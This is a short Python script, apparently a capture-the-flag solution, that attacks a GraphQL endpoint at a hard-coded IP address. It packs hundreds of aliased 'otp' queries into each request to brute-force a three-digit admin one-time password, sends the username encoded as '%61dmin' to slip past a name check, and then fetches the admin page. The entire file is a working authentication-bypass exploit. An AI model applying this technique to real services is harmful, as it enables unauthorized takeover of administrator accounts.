import httpx

url = "http://localhost:7654/"
url = "http://34.84.220.22:7654/"
query_first= "{otp(u:\"%ffdmin\",i:0,otp:\"000\"),"
query = "otp_{}:otp(u:\"%61dmin\",i:{},otp:\"{}\"),"

for k in range(0,40):
    print(f"Trying {k}")
    for ii in range(5):
        queries = ""
        for i in range(200*ii,200*(ii+1)):
            queries += query.format(i,k,format(i,'03d'))
        final_query = query_first + queries[:-1] + "}"
        # httpx를 사용하여 GET 요청 보내기
        full_url = f"{url}graphql?query={final_query}"
        r = httpx.get(full_url)
        if "OK" in r.text:
            print(f"OK: {k}")
            break
r = httpx.get(f"{url}Admin")
print(r.text)
